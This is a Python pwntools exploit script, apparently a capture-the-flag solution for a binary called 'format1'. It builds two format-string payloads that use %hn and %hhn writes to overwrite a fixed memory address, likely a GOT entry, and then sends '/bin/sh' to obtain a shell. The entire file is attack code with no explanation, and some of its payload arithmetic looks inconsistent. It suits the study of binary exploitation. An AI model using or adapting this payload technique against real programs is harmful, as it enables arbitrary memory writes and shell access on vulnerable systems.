from pwn import *

import time

target = process("./format1")
gdb.attach(target, gdbscript="verify_exploit")

address = 0x601030
address0 = p64(address + 0x0)
address1 = p64(address + 0x2)
# The value we are trying to write
value = 0x400785

# The print value size, to control the value being written
print0 = "%1925c"
print1 = "%187c"

# Specify the offset to the address, and write to it
write0 = "%12$hn"
write1 = "%13$hhn"

# Form the payload
payload = ""
payload += print0
payload += write0
payload += print1
payload += write1
payload += "0"*(0x20 - len(payload))
payload += address0
payload += address1

# Send the fmt string payload
target.sendline(payload)
address = 0x601030
address0 = p64(address + 0x0)
address1 = p64(address + 0x2)
# The value we are trying to write
value = 0x4005f0

# The print value size, to control the value being written
print0 = "%1520c"
print1 = "%80c"

# Specify the offset to the address, and write to it
write0 = "%12$hn"
write1 = "%13$hhn"

# Form the payload
payload = ""
payload += print0
payload += write0
payload += print1
payload += write1
payload += "0"*(0x20 - len(payload))
payload += address0
payload += address1

# Send the fmt string payload
target.sendline(payload)

target.sendline("/bin/sh\x00")

target.recvall(timeout = 2)
